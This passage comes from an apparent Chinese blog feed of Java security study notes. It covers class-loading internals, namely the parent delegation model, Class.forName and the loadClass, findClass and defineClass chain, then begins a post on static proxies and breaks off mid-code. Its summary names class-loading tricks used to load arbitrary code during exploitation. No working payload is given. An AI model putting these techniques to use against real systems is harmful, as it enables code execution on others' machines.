alt="image-20251122201828302"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA类加载机制</title>
    <link href="/2025/11/19/JAVA%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"/>
    <url>/2025/11/19/JAVA%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVA类加载机制"><a href="#JAVA类加载机制" class="headerlink" title="JAVA类加载机制"></a>JAVA类加载机制</h1><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251119163436786.png" alt="image-20251116155501990"></p><p>也就是说在使用的时候会执行一些代码</p><p>（反序列化就是readobject代码自动加载）</p><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>赋予了 Java 类可以被动态加载到 JVM 中并执行的能力</p><ul><li>类加载器是一个负责加载类的对象，用于实现类加载过程中的加载这一步</li><li>每个 Java 类都有一个引用指向加载它的 <code>ClassLoader</code></li><li>数组类不是通过 <code>ClassLoader</code> 创建的（数组类没有对应的二进制字节流），是由 JVM 直接生成的</li></ul><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">T</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #ABB2BF">...</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">final</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ClassLoader</span><span style="color: #E06C75"> classLoader</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">CallerSensitive</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassLoader</span><span style="color: #61AFEF"> getClassLoader</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">     </span><span style="color: #7F848E; font-style: italic">//...</span></span><span class="line"><span style="color: #ABB2BF">  }</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #ABB2BF">...</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p><strong>主要作用就是动态加载 Java 类的字节码（ <code>.class</code> 文件）到 JVM 中（在内存中生成一个代表该类的 <code>Class</code> 对象）。</strong></p><h2 id="加载规则"><a href="#加载规则" class="headerlink" title="加载规则"></a>加载规则</h2><p>JVM 启动的时候，并不会一次性加载所有的类，而是根据需要去<strong>动态加载</strong>（调用才加载）</p><p>对于已经加载的类会被放在 <code>ClassLoader</code> 中。在类加载的时候，系统会首先判断当前类是否被加载过。已经被加载的类会直接返回，否则才会尝试加载。也就是说，对于一个类加载器来说，相同二进制名称的类只会被加载一次</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">abstract</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ClassLoader</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #ABB2BF">...</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">final</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ClassLoader</span><span style="color: #E06C75"> parent</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #7F848E; font-style: italic">// 由这个类加载器加载的类。</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">final</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Vector</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">&gt;&gt;</span><span style="color: #E06C75"> classes </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Vector</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #7F848E; font-style: italic">// 由VM调用，用此类加载器记录每个已加载类。</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> addClass</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75; font-style: italic">c</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">classes</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addElement</span><span style="color: #ABB2BF">(c);</span></span><span class="line"><span style="color: #ABB2BF">   }</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #ABB2BF">...</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><h3 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h3><p> <code>static &#123;&#125;</code>，类第一次加载到 JVM 时执行一次。只执行一次！</p><p><strong>用途：</strong></p><ul><li>初始化类的静态资源（静态变量）</li><li>只需要执行一次的准备动作（如加载配置文件、注册驱动等）</li></ul><p><strong>特点：</strong></p><ul><li><strong>只执行一次</strong></li><li><strong>最早执行</strong>（甚至早于 main）</li></ul><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Demo</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;静态代码块：类加载时执行一次&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h3 id="构造代码块（实例代码块）"><a href="#构造代码块（实例代码块）" class="headerlink" title="构造代码块（实例代码块）"></a>构造代码块（实例代码块）</h3><p><code>&#123; &#125;</code>，每创建一个对象时执行一次，而且执行顺序在构造方法之前。</p><p><strong>用途：</strong></p><ul><li>多个构造方法间共享代码（避免重复）</li></ul><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Demo</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;构造代码块：每次 new 对象时都会执行&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> Demo</span><span style="color: #ABB2BF">(){</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;构造函数：最后执行&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h3 id="构造函数（构造方法）"><a href="#构造函数（构造方法）" class="headerlink" title="构造函数（构造方法）"></a>构造函数（构造方法）</h3><p>每创建一个对象时执行一次，在构造代码块之后。</p><p><strong>用途：</strong></p><ul><li>初始化对象的成员变量</li><li>创建对象时执行特定逻辑</li></ul><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Demo</span><span style="color: #E06C75">() {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;构造方法执行！&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p><strong>对比</strong></p><table><thead><tr><th>名称</th><th>触发条件</th><th>执行次数</th><th>目的</th></tr></thead><tbody><tr><td><strong>静态代码块 static {}</strong></td><td>类加载时</td><td>一次</td><td>初始化静态资源</td></tr><tr><td><strong>构造代码块 {}</strong></td><td>创建对象</td><td>每次 new 都执行</td><td>构造方法前统一代码</td></tr><tr><td><strong>构造方法</strong></td><td>创建对象</td><td>每次 new 都执行</td><td>初始化对象属性</td></tr></tbody></table><h3 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName()"></a>Class.forName()</h3><ul><li><p>用来 手动加载类 的方法</p><p><code>Class.forName()</code> 会触发：类加载 + 类初始化（执行静态代码块）</p></li><li><p>跟进查看原因：</p><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251115221659584.png" alt="image-20251115221659426"></p><p>在forName调用的是<code>forName0</code>方法</p></li><li><p>看forName0&#96;方法</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251119163436664.png" alt="image-20251115221822053"></p><p>native意思是c&#x2F;c++写的</p><p>传参：类名，判断<code>（是否初始化）</code>，类加载器，其他<code>（这个参数传递的都是null，不用写）</code></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251115222737358.png" alt="image-20251115222737321"></p><p>forname的重写，判断有没有初始化</p></li></ul></li><li><p>查看默认</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251115223127547.png" alt="image-20251115223127503"></p><p>默认是true，也就是说默认是初始化的</p><p><strong>所以：</strong></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">ClassLoader</span><span style="color: #E06C75"> cl </span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">ClassLoader</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getPlatformClassLoader</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;com.example.demo.Person&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>手动修改，不会默认进行初始化</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">ClassLoader</span><span style="color: #E06C75"> cl </span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">ClassLoader</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getPlatformClassLoader</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;com.example.demo.Person&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #C678DD">new</span><span style="color: #E06C75">Instance</span></span></code></pre></div></div></figure><p>即可初始化</p><p> <code>c.newInstance</code>用于创建一个类的实例，相当于调用它的 <strong>无参构造方法</strong>。</p></li></ul><h2 id="研究底层"><a href="#研究底层" class="headerlink" title="研究底层"></a>研究底层</h2><h3 id="双亲委派"><a href="#双亲委派" class="headerlink" title="双亲委派"></a>双亲委派</h3><p><a href="https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B">https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B</a></p><p>用于确定使用哪个加载类的</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251119163436937.png" alt="image-20251116154159173"></p><p>不是继承关系，是逻辑上的流程指向</p><p>而且这三个就加载器，所<strong>加载的路径</strong>不同</p><ul><li><strong>Bootstrap ClassLoader（启动类加载器）</strong>：加载 <code>$JAVA_HOME/jre/lib</code> 目录下的核心类库（如 <code>rt.jar</code>、<code>resources.jar</code> 等），也可通过 <code>-Xbootclasspath</code> 参数指定路径。</li><li><strong>Extension ClassLoader（扩展类加载器）</strong>：加载 <code>$JAVA_HOME/jre/lib/ext</code> 目录下的类，或通过系统属性 <code>java.ext.dirs</code> 指定的路径。</li><li><strong>Application ClassLoader（应用程序类加载器）</strong>：加载 <code>classpath</code> 路径下的类，包括项目的 <code>src/main/classes</code>、<code>lib</code> 目录下的 jar 包，或通过 <code>-cp</code>&#x2F;<code>-classpath</code> 参数指定的路径。</li></ul><h3 id="ClasshLoader"><a href="#ClasshLoader" class="headerlink" title="ClasshLoader"></a><code>ClasshLoader</code></h3><ul><li><p>loadclass不进行初始化</p></li><li><p>跟进去看看</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251119163438829.png" alt="image-20251118093549650"></p><p>先调用一个参数到loadclass，返回了两个参数的loadclass</p></li><li><p>跟进loadclass（ —-  ,  —–）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251118094001608.png" alt="image-20251118094001550"></p></li><li><p>到findclass（）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251118094440116.png" alt="image-20251118094440081"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251119163438588.png" alt="image-20251118203017193"></p><p>是相当于两者都是继承了urlclassload（其他两个没到找到findclass，所以就直接去了父类）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251119163439254.png" alt="image-20251118203448005"></p><p>而且目前已经生成了path（对于person）</p><p>从路径中寻找，找到了之后调用了<strong>defineclass类</strong></p></li><li><p>步入defineclass</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251118205224614.png" alt="image-20251118205224297"></p><p>用于安全判断</p><p>但是后面的返回值还调用了一个defineclass()</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251119163441243.png" alt="image-20251118205327222"></p></li><li><p>到SecureClassLoader.java（是urlclassload的父类）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251118205631283.png" alt="image-20251118205631243"></p></li><li><p>接下来</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251119163441567.png" alt="image-20251118221037684"></p><p>调用了defindclass1</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251119163441612.png" alt="image-20251118221126615"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251119163442450.png" alt="image-20251118221522174"></p><p>通过传入类名，以及编译之后的字节码，利用字节码直接将类搞出来</p></li></ul><p><strong>流程：</strong></p><p>​继承：ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader</p><p>​执行：loadClass-&gt;findClass(重写的方法)-&gt;defineClass(从字节码加载类)</p><p><strong>问题：</strong></p><p>test里面，静态写入获取计算器的命令执行代码：执行完成之后，删除test类，在主类里用urlclassloader.loadclass(Test)，为什么还会弹出计算器？？？</p><p>因为：只要类已经被加载到 JVM 中，其静态代码块就会执行，且不会因后续文件删除而撤销执行结果。</p><p><strong>总结：</strong></p><ol><li><p>类加载与反序列化类加载的时候会执行代码<br>初始化:静态代码块<br>实例化:构造代码块、无参构造函数</p></li><li><p>动态类加载方法<br>Class.forname<br>初始化&#x2F;不初始化<br>ClassLoader.loadClass不进行初始化<br>底层的原理，实现加载任意的类</p></li><li><p>漏洞利用</p><p>URLClassLoader任意类加载:file&#x2F;http&#x2F;jar</p><p>ClassLoader.defineClass 字节码加载任意类 私有</p><p>Unsafe.defineClass 字节码加载 public 类不能直接生成 Spring 里面可以直接生成</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JDK静态&amp;&amp;动态代理</title>
    <link href="/2025/11/14/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <url>/2025/11/14/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="JDK静态-动态代理"><a href="#JDK静态-动态代理" class="headerlink" title="JDK静态&amp;&amp;动态代理"></a>JDK静态&amp;&amp;动态代理</h1><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>类里面的类</p><p>eg：房东只有房；中介即收中介费，还管理后期的维修问题（不能把所有东西都堆给房东）</p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>包含三个角色：</p><p>接口类（抽象角色）：定义共同的方法（比如 <code>IUser</code>）</p><p>目标类（真实角色）：实现接口中的方法（比如 <code>UserImpl</code>）</p><p>代理类（代理角色）：也实现接口，但在调用目标类方法前后加上“增强逻辑”（比如 <code>UserProxy</code>）</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>接口类：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.test</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">interface</span><span style="color: #E06C75">  </span><span style="color: #E5C07B">IUser</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> show</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> creat</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> update</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>真实类：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.test</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">UserImpl</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">IUser</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> show</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;展示&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> creat</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;creat&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> update</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;update&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>代理类：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.test</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">UserProxy</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">IUser</span><span style="color: #E06C75">  </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">IUser</span><span style="color: #E06C75"> user</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> UserProxy</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">IUser</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">user</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">user</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> user;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> show</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">      </span><span style="color: #E5C07B">user</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">show</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">      </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;调用了show&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> creat</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">user</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">creat</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;调用了Creat&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> update</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span 